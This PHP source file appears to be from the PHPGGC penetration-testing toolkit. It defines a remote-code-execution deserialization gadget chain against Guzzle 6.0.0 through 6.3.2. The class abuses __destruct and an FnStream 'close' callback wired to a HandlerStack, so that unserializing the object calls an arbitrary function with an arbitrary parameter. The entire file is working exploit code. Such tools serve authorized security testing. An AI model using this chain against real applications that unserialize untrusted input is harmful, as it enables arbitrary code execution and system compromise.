<?php

namespace GadgetChain\Guzzle;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '6.0.0 <= 6.3.2';
    public $vector = '__destruct';
    public $author = 'proclnas';
    public $informations = '';


    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \GuzzleHttp\Psr7\FnStream([
            'close' => [
                new \GuzzleHttp\HandlerStack($function, $parameter),
                'resolve'
            ]
        ]);
    }
}
